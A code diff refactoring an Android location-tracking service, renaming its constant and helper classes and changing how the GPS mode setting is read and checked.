@@ -33,11 +33,11 @@ import com.google.android.gms.common.GooglePlayServicesUtil;
 import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * LocationTracker class is designed to monitoring location
@@ -83,7 +83,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	// flag for GPS status
 	private Context mContext;
 	private Location location; // location
-	private String geoMode = null;
+	private int geoMode = -1;
 
 	@Override
 	public void onCreate() {
@@ -96,8 +96,10 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		int timeUp = WhileTheMethod.getState(3, this);
-		geoMode = sp.getString("geo_mode", "1");
+		int timeUp = ValueWork.getState(
+				ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, this);
+		geoMode = ValueWork.getMethod(
+				ConstantValue.LOCATION_TRACKER_MODE, this);
 		locationManager = (LocationManager) mContext
 				.getSystemService(LOCATION_SERVICE);
 		// ----------get geo time
@@ -167,7 +169,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			// --------------- getting geo_mode
 			// --------------------------------------------
 
-			if ((geoMode.equals("1")) && isGPSEnabled && !servicesAvailable()) {
+			if (geoMode != -1 && isGPSEnabled && !servicesAvailable()) {
 
 				locationValue.setGPSLocation(true);
 				Logging.doLog(TAG, "GPS set true ", "GPS set true ");
@@ -329,7 +331,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 						String.format("%.02f", locationValue.getAccuracy()));
 				object.put("time", ConvertDate.logTime());
 				object.put("type",
-						ConstantRequest.TYPE_LOCATION_TRACKER_REQUEST);
+						ConstantValue.TYPE_LOCATION_TRACKER_REQUEST);
 				object.put("info", info);
 
 				sendJSONStr = object.toString();
@@ -465,7 +467,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 				.setFastestInterval(MILLISECONDS_PER_MINUTE);
 		Logging.doLog(TAG, "geomode setPrioity" + geoMode, "geomode setPrioity"
 				+ geoMode);
-		if (geoMode.equals("1"))
+		if (geoMode != -1)
 			mLocationRequest
 					.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
 		else
